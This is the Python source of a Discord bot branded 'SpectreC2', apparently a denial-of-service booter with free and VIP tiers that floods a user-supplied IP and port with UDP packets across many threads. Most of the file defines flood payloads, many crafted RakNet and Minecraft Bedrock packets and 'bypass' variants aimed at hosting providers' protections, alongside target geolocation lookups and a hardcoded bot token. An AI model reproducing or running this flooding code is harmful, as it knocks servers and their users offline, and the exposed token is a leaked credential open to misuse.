import discord
from discord.ext import commands
import socket
import random
import threading
import asyncio
import time
import os
import aiohttp
import requests
import struct



vip_users = [
    1189438649734004810,
    987654321098765432, 1274878515648659498
]

vip_only_methods = ["RAKNETV4", "UDPNEO", "PATHBYPASS", "UNIBYPASS", "UDPSHIELD", "UDP50G", "UDP10G", "ROBLOX", "UDPRAW", "UDPNUKE", "UDPHAND", "UDPLOGIN", "UDPNULL", "NEOFRACTAL", "RECONNECTBOMB", "GHOSTACKV2", "FUSIONBYPASS", "COSMICPHANTOM", "JUNK", "NTP", "MEM", "ROBLOX", "MINECRAFT", "UDPFAST", "TCPOVH", "TCPHIBRID", "DNSAMP", "TCPKILL"
]
def is_vip(user_id):
    return user_id in vip_users


methods = [
    "UDPPPS", "UDPPACKETS", "UDPFURY", "MCPE", "UDPWALL", "RAKNETV2", "OVHBYPASS", "TCPSHIELD", "UDPQUERY", "UDPGAME", "UDPHEX", "RAKNETV3", "TUP", "MIXAMP", "UDPBYPASS", "MIXAMPV2", "UDPPULSE", "UDPSMART", "UDPLOW", "UDPPPSV2", "HETZBYPASS", "UDPHOME", "RAKNETV5", "UDPMIX", "UDPHEXV2", "UDPSPAM", "UDPINVALID", "UDPTROLL", "UDPTROLLV2", "MCPEV2", "RAKCUSTOM", "PATHV2", "RAKNETV6", "RAKNETV7", "UDPROTATE", "UDPGOOD", "TCPCONNECT", "TCPFLOOD", "TCPUNCONNECT", "TCPMIX", "TCPBYPASS", "TCP-ACK"
]

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

def build_packet(method, ip):
    if method == "UDPPPS":
        return b"A" * 64
    elif method == "UDPPACKETS":
        return b"B" * 1024
    elif method == "UDPFURY":
        return random._urandom(512)
    elif method == "MCPE":
        return b"\x00\xff" + random._urandom(128)
    elif method == "UDPSHIELD":
        return random._urandom(1024)
    elif method == "RAKNET":
        return b"\x00\xC0\x80\x01\x00" + random._urandom(32)
    elif method == "UDPBYPASS":
        return str.encode("x" * 600)
    elif method == "TCPSHIELD":
        packet = b"HTTP/1.1 GET / HTTP/1.1\r\nHost: " + bytes(target_ip, 'utf-8')
    elif method == "MIXAMP":
        return random.choice([b"A"*32, b"B"*64, b"C"*128, b"D"*256])
    elif method == "UDPSLOW":
        return b"\x00" * 16
    elif method == "TUP":
        return bytes([random.randint(0, 255)]) * 70
    elif method == "UDPHEX":
        return bytes.fromhex('f0a1b2c3d4') + random._urandom(60)
    elif method == "UDPRAND":
        return random._urandom(random.randint(48, 512))
    elif method == "UDPPULSE":
        return b"\x55" * 70
    elif method == "UDPPPSV2":
        return b"\x01" * 24
    elif method == "UDPFAST":
        return str.encode("a" * 1)
    elif method == "UDPNEO":
        header = random.choice([b"\x05\x00", b"\x01\x00", b"\x1c\x00"])
        return header + random._urandom(random.randint(40, 100))
    elif method == "PATHBYPASS":
        header = random.choice([b"\x05", b"\x01", b"\x1c", b"\x00"])
        return header + random._urandom(random.randint(20, 80))
    elif method == "UDPSMART":
        return random._urandom(random.randint(32, 128))
    elif method == "HETZBYPASS":
        return random._urandom(random.randint(128, 378))
    elif method == "UNIBYPASS":
        return b"\x17\xfa" + random._urandom(2) + random._urandom(random.randint(80, 260))
    elif method == "UDPWALL":
        header = b"\x45" + bytes([random.randint(0x10, 0xFF)])
        return header + random._urandom(random.randint(90, 173))
    elif method == "UDPLOW":
        return str.encode("x" * 130)
    elif method == "MIXAMPV2":
        return random.choice([b"A"*24, b"B"*32, b"C"*64, b"D"*128, b"E"*256, b"F"*324])
    elif method == "UDPQUERY":
        session_id = random.randint(1, 999999).to_bytes(4, 'big')
        return b"\xFE\xFD\x09" + session_id + b"\x00\x00\x00\x00"
    elif method == "UDPGAME":
        mtu = 1464
        return random.choice([
            b"\xFE\xFD\x09" + random._urandom(mtu - 3),
            b"\xFE\xFD\x00" + random._urandom(mtu - 3)
        ])
    elif method == "RAKNETV2":
        timestamp = int(time.time()).to_bytes(8, 'big')
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        guid = random._urandom(8)
        return b'\x01' + timestamp + magic + guid
    elif method == "RAKNETV3":
        return b'\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    elif method == "RAKNETV4":
        return b"\x01\x00\x00\x01\x96\xfa\x25\x30\xc4\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x04\xb1\x12\x3a\xd4\x58\x8d\x8f"
    elif method == "OVHBYPASS":
        headers = [
            b'\x01\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
            b'\x17\xfa' + random._urandom(2),
            b'\x05' + random._urandom(7)
        ]
        return random.choice(headers) + random._urandom(random.randint(64, 512))
    elif method == "UDP1G":
        return random._urandom(1400)
    elif method == "UDP5G":
        return random._urandom(1472)
    elif method == "RAKNETV5":
        # Packet ID: 0x01 (Unconnected Ping)
        packet_id = b'\x01'
        
        timestamp = int(time.time()).to_bytes(8, 'big')
        
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        
        guid = random._urandom(8)
        
        client_id = random._urandom(4)
        
        random_data = random._urandom(random.randint(4, 10))
        
        return packet_id + timestamp + magic + guid + client_id + random_data
    elif method == "DNSAMP":
        return b'\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
    elif method == "UDPNUKE":
        return os.urandom(4)
    
    elif method == "UDPSPAM":
        return os.urandom(32)  # Pequeño payload binario aleatorio
        
    elif method == "UDPRAW":
        spoofed_header = b"\x45\x00" + os.urandom(10)  # Parte de un header IP fake
        fake_udp_header = b"\x00\x35\x00\x35"  # Puerto 53 -> 53 (DNS simulación)
        payload = b"\xDE\xAD\xBE\xEF" + os.urandom(24)  # Fake body
        return spoofed_header + fake_udp_header + payload

    elif method == "UDPMIX":
        return random.choice([
            b"\x00" * 128,
            b"\xff" * 128,
            random._urandom(256),
            b"A" * 64 + b"\x00" * 64,
            b"\x17\xfa" + random._urandom(2) + random._urandom(100),
            b"\xFE\xFD\x09" + random._urandom(96)
        ])
        
    elif method == "UDPINVALID":
        payloads = [
            b'\x00\x00\x00\x00\x00\x00\x00\x00',
            b'\xff' * 32,
            b'\x01\x02\x03',
            b'INVALID_PACKET',
            b'\x80' + bytes([random.randint(0, 255) for _ in range(31)]),
            bytes([random.randint(0, 255) for _ in range(64)])
        ]
        return random.choice(payloads)
     
    elif method == "UDPTROLL": 
        return random.choice([b"A"*1, b"B"*2, b"C"*3, b"D"*1, b"E"*2, b"F"*3])
        
    elif method == "UDPHEXV2":
        return b'\x55\x55\x55\x55\x00\x00\x00\x01' 
    
    elif method == "JUNK":
        return b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'       

    elif method == "NTP":
        return "\x17\x00\x03\x2a" + "\x00" * 4
        
    elif method == "MEM":
        return b'\x00\x00\x00\x00\x00\x01\x00\x00'
        
    elif method == "UDPHAND":
        return b'\x00\x00\xFF\xFF' + random._urandom(10)
    
    elif method == "UDPLOGIN":
        return b'\x02\x00\x07BotUser' + random._urandom(5)
        
    elif method == "UDPNULL":
        return b""
        
    elif method == "MCPEV2":
        timestamp = int(time.time()).to_bytes(99, 'big')
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        guid = random._urandom(99)
        return b'\x01' + timestamp + magic + guid
        
    elif method == "RAKCUSTOM":
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        guid = random._urandom(8)
        return b'\x05\x00' + magic + guid 
        
    elif method == "PATHV2":
         packet_id = b'\x01'
         timestamp = int(time.time()).to_bytes(8, 'big')
         fake_magic = b'\x01\xab\xcd\xef\x01\xab\xcd\xef\x01\xab\xcd\xef\x01\xab\xcd\xef'
         guid = random._urandom(8)
         return packet_id + timestamp + fake_magic + guid
         
    elif method == "RAKNETV6":
        timestamp = int(time.time()).to_bytes(8, 'big')
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        guid = random._urandom(16)
        return b'\x01' + timestamp + magic + guid

    elif method == "RAKNETV7":
        packet_id = b'\x01'  # Unconnected Ping MCPE 0.15.10
        timestamp = struct.pack('>Q', int(time.time() * 1000))  # 8 bytes big-endian timestamp ms
        client_guid = struct.pack('>Q', 1234567890)  # 8 bytes fixed GUID (igual que tu función)
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'  # 16 bytes magic
        mtu_size = struct.pack('<H', 1460)

        packet = packet_id + timestamp + client_guid + magic + mtu_size
        return packet
        
    elif method == "NEOFRACTAL":
         magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
         timestamp = int(time.time()).to_bytes(8, 'big')     
         guid = random._urandom(8)
         name = b'\x00Player' + random._urandom(random.randint(2, 5))
         return b'\x01' + timestamp + magic + guid + name
    
    elif method == "RECONNECTBOMB":
         session_id = random.randint(100000, 999999).to_bytes(4, 'big')
         reconnect = b'\xfe\xfd\x09' + session_id + random._urandom(8)
         return reconnect
    
    elif method == "GHOSTACKV2":
         ack_id = b'\xc0' + random._urandom(1)
         ghost_data = random._urandom(random.randint(4, 32))
         return ack_id + ghost_data
    
    elif method == "FUSIONBYPASS":
         magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
         spoof = b'\x17\xfa' + random._urandom(2)
         padding = b'\x00' * random.randint(5, 25)
         return random.choice([
         spoof + magic + padding,
         b'\x05' + random._urandom(7) + spoof
    ])
    
    elif method == "COSMICPHANTOM":
         phantom_magic = b'\x01\xab\xcd\xef\x01\xab\xcd\xef'
         ghost_id = random._urandom(4)
         payload = b'\x05' + phantom_magic + ghost_id + random._urandom(16)
         return payload
    
    elif method == "UDPTROLLV2":
        return random.choice([b"A"*1, b"B"*2, b"C"*240, b"D"*1, b"E"*299, b"F"*3])
    else:
        return None

def attack(target_ip, target_port, method, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = build_packet(method, target_ip)

    if not packet:
        return

    while time.time() < end_time:
        try:
            sock.sendto(packet, (target_ip, target_port))
        except:
            break

@bot.command()
async def c2(ctx, ip: str, port: int, time_: int, method: str, threads: int = 10):
    method = method.upper()
    all_methods = methods + vip_only_methods

    if method not in all_methods:
        await ctx.send(f"❌ Invalid. Usa:\n```{', '.join(all_methods)}```")
        return

    if method in vip_only_methods and not is_vip(ctx.author.id):
        await ctx.send("[🔒] Access denied.")
        return

    plan = "VIP" if ctx.author.id in vip_users else "free"
    
    embed = discord.Embed(
    title="🚀 SPECTREC2 🕷️",
    description=(
        f"***Mode***: `{plan}`\n"
        f"***IP***: `{ip}`\n"
        f"***PORT***: `{port}`\n"
        f"***THREADS***: `{threads}`\n"
        f"***METHOD***: `{method}`\n"
        f"***TIME***: `{time_}`\n"
    ),
    color=discord.Color.random()
    )
    
    embed.set_thumbnail(url="https://media2.giphy.com/media/F2U5dFf4LG1zYmnJS2/giphy.gif")
    embed.set_footer(text="©SpectreC2 SkylerModz", icon_url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else None)
    
    embed.timestamp = discord.utils.utcnow()

    await ctx.send(embed=embed)

    loop = asyncio.get_event_loop()
    for _ in range(threads):
        loop.run_in_executor(None, attack, ip, port, method, time_)
        
    embed = discord.Embed(
    title="Attack Launched!",
    color=discord.Color.random()
    )
    embed.set_footer(text="©SpectreC2 SkylerModz", icon_url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else None)
    
    embed.timestamp = discord.utils.utcnow()

    await ctx.send(embed=embed)

    await asyncio.sleep(time_)
    embed = discord.Embed(
    title="Attack ended!",
    color=discord.Color.from_rgb(255, 255, 255)  # Blanco
    )
    embed.set_footer(text="©SpectreC2 SkylerModz", icon_url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else None)
    
    embed.timestamp = discord.utils.utcnow()

    await ctx.send(embed=embed)


@bot.command()
async def ping(ctx, ip: str, port: int = 19132):
    await ctx.send(f"[🕙] Checking ping `{ip}:{port}`...")

    url = f"https://api.mcsrvstat.us/bedrock/3/{ip}:{port}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()

                    if data.get("online") is True:
                        # Extraemos datos seguros del JSON
                        motd = "\n".join(data.get("motd", {}).get("clean", ["(Sin MOTD)"]))
                        version = data.get("version", "Desconocida")
                        players = data.get("players", {})
                        players_online = players.get("online", "?")
                        players_max = players.get("max", "?")

                        embed = discord.Embed(title="[🎮] Servidor Online", color=discord.Color.green())
                        embed.add_field(name="[🏷️] MOTD", value=motd, inline=False)
                        embed.add_field(name="[⚙️] Versión", value=version, inline=True)
                        embed.add_field(name="[👥] Jugadores", value=f"{players_online}/{players_max}", inline=True)
                        embed.set_footer(text=f"IP: {ip}:{port}")

                        await ctx.send(embed=embed)
                    else:
                        await ctx.send(f">❌<Server Timeout")
                else:
                    await ctx.send(f"Api Error (status {resp.status}).")
    except Exception as e:
        await ctx.send(f"[❌] Error al hacer ping: `{str(e)}`")
        
# Comando de prueba
@bot.command()
async def botstatus(ctx):
    embed = discord.Embed(
    title="Status",
    description = (
    f"***Bot Status***: Online🟢\n"
    f"***Server Status***: Online🟢\n"
    f"***Machine Status***: Online🟢"
    ),
    color=discord.Color.random()
    )
    
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1378112799196057681/1380652670284468365/image0.gif?ex=6844a87f&is=684356ff&hm=40ca749b27e72d08418ea64b8ea8a1b7842b4ec071d43fa9cb06620327a5691b&")
    embed.set_footer(text="©SpectreC2", icon_url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else None)
    
    embed.timestamp = discord.utils.utcnow()

    await ctx.send(embed=embed)
    
@bot.command()
async def method(ctx):
   await ctx.send("Methods availables:\n`UDPPPS`\n`UDPPACKETS`\n`UDPFURY`\n`MCPE`\n`OVHBYPASS`\n`RAKNETV2`\n`TCPSHIELD`\n`UDPQUERY`\n`UDPGAME`\n`UDPHEX`\n`RAKNETV3`\n`UDPBYPASS`\n`TUP`\n`MIXAMP`\n`MIXAMPV2`\n`UDPLOW`\n`UDPSMART`\n`UDPPULSE`\n`UDPPPSV2`\n`HETZBYPASS`\n`UDPRAND`\n`MCPEV2`\n`RAKCUSTOM`\nMore methods In method2 (command) .")
    
@bot.command()
async def method2(ctx):
   await ctx.send("`DNSAMP`\n`UDPSPAM`\n`UDPHEXV2`\n`UDPMIX`\n`UDPTROLL`\n`UDPTROLLV2`\n`PATHV2`\n`RAKNETV6`\n`RAKNETV7`\n`UDPROTATE`\n`UDPGOOD`\n`TCPCONNECT`\n`TCPFLOOD`\n`TCPUNCONNECT`\n`TCPMIX`\n``TCPBYPASS``\n`TCP-ACK`\n`")

@bot.command()
async def ayudaa(ctx):
   await ctx.send(".methods\n.pingtools\n.iptracker\nMore commands soon...")

@bot.command()
async def query(ctx, ip: str, port: int = 19132):
    await ctx.send(f" Quering... `{ip}:{port}`...")

    raknet_ping = b'\x01' + struct.pack('>Q', int(time.time() * 1000)) + \
                  b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    try:
        start = time.perf_counter()
        sock.sendto(raknet_ping, (ip, port))
        data, _ = sock.recvfrom(2048)
        end = time.perf_counter()
        latency = (end - start) * 1000

        if data[0] != 0x1c:
            await ctx.send("Malformed Ping Received Or Unknown error.")
            return

        motd_raw = data[35:].decode(errors="ignore")
        parts = motd_raw.split(';')

        if len(parts) >= 6:
            motd, protocol, version, online, maxp, serverid = parts[:6]

            embed = discord.Embed(
                title=" Server Info",
                color=discord.Color.green()
            )
            embed.add_field(name="NAME", value=motd, inline=False)
            embed.add_field(name="Version", value=version, inline=True)
            embed.add_field(name="Players", value=f"{online}/{maxp}", inline=True)
            embed.add_field(name="Protocol", value=protocol, inline=True)
            embed.add_field(name="Latency", value=f"{latency:.2f} ms", inline=True)
            embed.set_footer(text=f"IP: {ip}:{port}")
            embed.timestamp = discord.utils.utcnow()

            await ctx.send(embed=embed)
        else:
            await ctx.send("Malformed data")

    except socket.timeout:
        await ctx.send("Connection Timeou")
    except Exception as e:
        await ctx.send(f" `{str(e)}`")
    finally:
        sock.close()
        
@bot.command()
async def pingtools(ctx):
    await ctx.send("`ping`\n`query`\nMore Ping tool soon")

@bot.command()
async def adduser(ctx, user_id: int):
    if not is_vip(ctx.author.id):
        await ctx.send("[🔒] Access denied. Solo VIPs pueden usar este comando.")
        return
    if user_id in vip_users:
        await ctx.send(f"Usuario {user_id} ya es VIP.")
        return
    vip_users.append(user_id)
    await ctx.send(f"Usuario {user_id} agregado a VIP correctamente.")

@bot.command()
async def deluser(ctx, user_id: int):
    if not is_vip(ctx.author.id):
        await ctx.send("[🔒] Access denied.")
        return
    if user_id not in vip_users:
        await ctx.send(f"Usuario {user_id} not founded.")
        return

    vip_users.remove(user_id)
    await ctx.send(f"Usuario {user_id} removido de [VIP] correctamente.")
    
@bot.command()
async def pinggame(ctx):
    await ctx.send("🎾Pong!")

@bot.command()
async def iptracker(ctx, domain: str):
    """Check IP"""
    try:
        ip = socket.gethostbyname(domain)
        await ctx.send(f"🔍 IP tracked: `{domain}`: `{ip}`")
    except socket.gaierror:
        await ctx.send(f"Not found Address for `{domain}`.")
    except Exception as e:
        await ctx.send(f"⚠️ Error: {str(e)}")
@bot.command()
async def methodvip(ctx):
    await ctx.send("`RAKNETV4`\n`UDP10G`\n`UDP50G`\n`UDPSHIELD`\n`PATHBYPASS`\n`UNIBYPASS`\n`UDPNEO`\n`UDPINVALID`\n`UDPRAW`\n`UDPNUKE`\n`UDPHAND`\n`UDPLOGIN`\n`JUNK`\nMore vip methods soon.")
@bot.command()
async def latency(ctx):
    start = time.perf_counter()  # Marca de tiempo inicial
    message = await ctx.send("[⏱️] Checking latencyy..")
    end = time.perf_counter()    # Marca de tiempo final

    latency_ms = (end - start) * 1000  # Convertimos a milisegundos
    await message.edit(content=f"[✅] Response  In {latency_ms:.2f} ms")
    
@bot.command()
async def plan(ctx):
    level = "VIP 🟡" if is_vip(ctx.author.id) else "FREE ⚪"
   
    embed = discord.Embed(
    title="[🗣️]RANKS",
    description=(
        f"***RANK***:\n ``{level}`\n"
    ),
    color=discord.Color.random()
    )
    embed.set_footer(text="©SpectreC2 SkylerModz", icon_url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else None)
    
    embed.timestamp = discord.utils.utcnow()

    await ctx.send(embed=embed)

@bot.command()
async def geoip(ctx, ip: str):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719")  # incluye proxy y todos los campos útiles
        data = response.json()

        if data["status"] != "success":
            await ctx.send(" IP inválid o no se pudo obtener info")
            return

        embed = discord.Embed(
            title="🌍 GeoIP",
            description=f"Info for IP: `{ip}`",
            color=discord.Color.blue()
        )

        embed.add_field(name="ISP", value=data.get("isp", "N/A"), inline=False)
        embed.add_field(name="Company", value=data.get("org", "N/A"), inline=False)
        embed.add_field(name="Country", value=f"{data.get('country', 'N/A')} ({data.get('countryCode', 'N/A')})", inline=False)
        embed.add_field(name="Region", value=data.get("regionName", "N/A"), inline=False)
        embed.add_field(name="City", value=data.get("city", "N/A"), inline=False)
        embed.add_field(name="Latitud", value=data.get("lat", "N/A"), inline=True)
        embed.add_field(name="Longitud", value=data.get("lon", "N/A"), inline=True)
        embed.add_field(name="ZIP", value=data.get("zip", "N/A"), inline=False)
        embed.add_field(name="Proxy / Hosting / VPN", value="Yes ✅" if data.get("proxy") else "No ❌", inline=False)

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Error al obtener datos: `{str(e)}`")
        
@bot.command()
async def botinfo(ctx):
    await ctx.send("Versión Bot: 7.5 [alpha]\nSoftware: Python3\nVersion Py: 3.9+\nThis version is Free\nBot created by: SkylerModz\n")
    
@bot.command()
async def pingv2(ctx, ip: str, port: int = 19132):
    await ctx.send(f"Pinging `{ip}:{port}`...")

    raknet_ping = b'\x01' + struct.pack('>Q', int(time.time() * 1000)) + b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        start = time.perf_counter()
        sock.sendto(raknet_ping, (ip, port))
        data, _ = sock.recvfrom(2048)
        end = time.perf_counter()
        sock.close()

        response_time = (end - start) * 1000

        if data[0] == 0x1c:
            motd_raw = data[35:].decode(errors="ignore")
            parts = motd_raw.split(';')
            if len(parts) >= 6:
                online, maxp = parts[4], parts[5]
                await ctx.send(f"[PING] {ip} {port} {response_time:.2f}ms {online}/{maxp}")
            else:
                await ctx.send(f"[PING] {ip} {port} {response_time:.2f}ms ?/?")
        else:
            await ctx.send(f"[PING] {ip} {port} No response")
    except socket.timeout:
        await ctx.send(f"[PING] {ip} {port}  Timeout")
    except Exception as e:
        await ctx.send(f"[PING] {ip} {port} ⚠️ Error: {str(e)}")
    
@bot.command()
async def methodsdetails(ctx):
    embed = discord.Embed(
    title="Methods Info",
    description = (
    f"Raknet - raknet Protocol Methods\n"
    f"Udp - Udp Methods using Bypass techniques and Generic methods\n"
    f"Customs - Custom Methods with diferents Bypasses and Combinations\n"
    f"Games - Games Methods for diferents Games and compatibility for diferents Methods Based in any games\n"
    f"UdpBypasses - Udp with Bypasses Using MultiFactors and Similares HumanTrafic and others methods (encode methods, simulatedTrafic, Low and others)\n"
    f"Others - Others methods for diferents games (not tested)\n"
    ),
    color=discord.Color.random()
    )
    
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1378112799196057681/1380652670284468365/image0.gif?ex=6844a87f&is=684356ff&hm=40ca749b27e72d08418ea64b8ea8a1b7842b4ec071d43fa9cb06620327a5691b&")
    embed.set_footer(text="©SpectreC2", icon_url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else None)
    
    embed.timestamp = discord.utils.utcnow()

    await ctx.send(embed=embed)
    
bot.run("MTM4OTM4NDkzNDQwMDk4MzEyMA.GHLIFg.w18MqTp9TatKZpmOH0rrbA31PD_uXSdzhruHKk")